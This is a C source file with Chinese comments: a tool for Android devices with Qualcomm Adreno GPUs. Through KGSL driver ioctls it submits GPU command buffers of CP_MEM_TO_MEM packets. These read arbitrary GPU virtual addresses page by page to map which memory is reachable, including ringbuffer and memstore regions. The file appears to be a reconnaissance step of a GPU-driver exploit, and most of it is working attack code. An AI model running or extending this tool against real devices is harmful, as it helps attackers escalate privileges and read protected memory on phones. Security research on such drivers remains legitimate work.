/* kgsl_vamap.c — GPU VA 页级存在性测绘(每页读 4 个 dword: +0,+0x100,+0x400,+0x800)
 * usage: kgsl_vamap <start_hex> <n_mb>
 * 目的: 判定哪些 GPU VA 真的映射(可读), 从而判断 RB/memstore/记录是否可达
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"
#define PKTS_PER_IB 160
#define PAGES_PER_BATCH (PKTS_PER_IB / 4)

static int fd; static uint64_t g_clsz;
static uint32_t *ib; static uint64_t ib_ga;
static uint32_t *out; static uint64_t out_ga; static uint32_t ctx;
static void cvac(void *a, void *b){ char*s=(char*)((uintptr_t)a&~(g_clsz-1));
  for(;s<(char*)b;s+=g_clsz) __asm volatile("dc cvac, %0"::"r"(s):"memory"); __asm volatile("dsb ish":::"memory"); }
static void civac(void *a, void *b){ char*s=(char*)((uintptr_t)a&~(g_clsz-1));
  for(;s<(char*)b;s+=g_clsz) __asm volatile("dc civac, %0"::"r"(s):"memory"); __asm volatile("dsb ish":::"memory"); }
static int submit(uint64_t ga, uint32_t size, uint32_t *ts){
    struct kgsl_command_object c; struct kgsl_gpu_command r;
    memset(&c,0,sizeof(c)); c.flags=KGSL_CMDLIST_IB; c.gpuaddr=ga; c.size=size;
    memset(&r,0,sizeof(r)); r.context_id=ctx; r.cmdsize=sizeof(c); r.numcmds=1; r.cmdlist=(unsigned long)&c;
    int e=ioctl(fd,IOCTL_KGSL_GPU_COMMAND,&r); if(ts)*ts=r.timestamp; return e; }
static void wait_ts(uint32_t ts){ struct{uint32_t c,t,to;}w={ctx,ts,3000}; ioctl(fd,_IOWR(0x09,0x07,char[12]),&w); }
static int mapb(void **h,size_t len,uint64_t *ga){
    void*p=mmap(NULL,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(p==MAP_FAILED) return 1; memset(p,0,len);
    struct kgsl_map_user_mem m; memset(&m,0,sizeof(m));
    m.len=len; m.hostptr=(unsigned long)p; m.memtype=KGSL_USER_MEM_TYPE_ADDR;
    if(ioctl(fd,IOCTL_KGSL_MAP_USER_MEM,&m)) return 1;
    *h=p; *ga=m.gpuaddr; return 0; }
static const uint32_t PROBE_OFF[4] = {0, 0x100, 0x400, 0x800};

int main(int argc, char **argv){
    setvbuf(stdout,NULL,_IONBF,0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0":"=r"(ctr)); g_clsz=4<<((ctr>>16)&0xf);
    fd=open("/dev/kgsl-3d0",O_RDWR|O_CLOEXEC); if(fd<0){printf("open fail\n");return 1;}
    mapb((void**)&ib,0x1000,&ib_ga); mapb((void**)&out,0x10000,&out_ga);
    struct kgsl_drawctxt_create cr={.flags=0x1812}; ioctl(fd,IOCTL_KGSL_DRAWCTXT_CREATE,&cr); ctx=cr.drawctxt_id;
    uint64_t start = argc>1?strtoull(argv[1],NULL,0):0x4000000000ULL;
    uint64_t npmb   = argc>2?strtoull(argv[2],NULL,0):16;      /* 测绘多少 MB */
    printf("# ib_ga=0x%llx out_ga=0x%llx  map 0x%llx + %llu MB (page-granular)\n",
           (unsigned long long)ib_ga,(unsigned long long)out_ga,(unsigned long long)start,(unsigned long long)npmb);
    double t0=0; struct timespec ts0; clock_gettime(CLOCK_MONOTONIC,&ts0); t0=ts0.tv_sec+ts0.tv_nsec/1e9;
    uint64_t total_pages = npmb*256;      /* 1MB = 256 pages */
    uint64_t hit_pages=0, printed=0;
    for (uint64_t p = 0; p < total_pages; p += PAGES_PER_BATCH) {
        uint32_t *c = ib; int npkt = 0;
        for (uint64_t q = p; q < p + PAGES_PER_BATCH && q < total_pages; q++) {
            uint64_t va = start + q*0x1000;
            for (int k = 0; k < 4; k++) {
                *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
                *c++ = 0;
                *c++ = lower_32_bits(out_ga + 4*(uint32_t)npkt); *c++ = upper_32_bits(out_ga + 4*(uint32_t)npkt);
                *c++ = lower_32_bits(va + PROBE_OFF[k]);          *c++ = upper_32_bits(va + PROBE_OFF[k]);
                npkt++;
            }
        }
        uint32_t dw=(uint32_t)(c-ib); cvac(ib,(char*)ib+dw*4);
        memset(out,0,npkt*4); cvac(out,(char*)out+npkt*4);
        uint32_t tsn=0;
        int r=submit(ib_ga,dw*4,&tsn);
        if(r){ printf("submit FAIL at page %llu (err)\n",(unsigned long long)p); break; }
        wait_ts(tsn);
        civac(out,(char*)out+npkt*4);
        for (uint64_t q = p; q < p + PAGES_PER_BATCH && q < total_pages; q++) {
            uint64_t any=0; uint32_t v0=out[(q-p)*4];
            for(int k=0;k<4;k++) any |= out[(q-p)*4+k];
            if(any){ hit_pages++;
                if(printed<40){ printed++;
                    printf("  PAGE 0x%llx: %08x %08x %08x %08x\n",(unsigned long long)(start+q*0x1000),
                           out[(q-p)*4],out[(q-p)*4+1],out[(q-p)*4+2],out[(q-p)*4+3]); }
            }
        }
    }
    struct timespec ts1; clock_gettime(CLOCK_MONOTONIC,&ts1);
    printf("map done: %llu/%llu pages non-zero, %.1fs\n",(unsigned long long)hit_pages,
           (unsigned long long)total_pages, ts1.tv_sec+ts1.tv_nsec/1e9-t0);
    return 0; }
